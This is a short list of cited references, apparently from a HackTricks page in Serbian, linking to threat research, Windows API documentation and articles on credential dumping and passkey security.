- [3] [Check Point Research – Inside Ink Dragon: Otkrivanje relay mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Nova attack surface u passwordless autentifikaciji](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG skladištenje ključeva](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Napadi na Microsoft sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory data store zaista funkcioniše: unutar NTDS.dit-a (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj cyber-espionage arsenal pomoću Still toolkit-a](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW funkcija i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – terminating active sessions](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
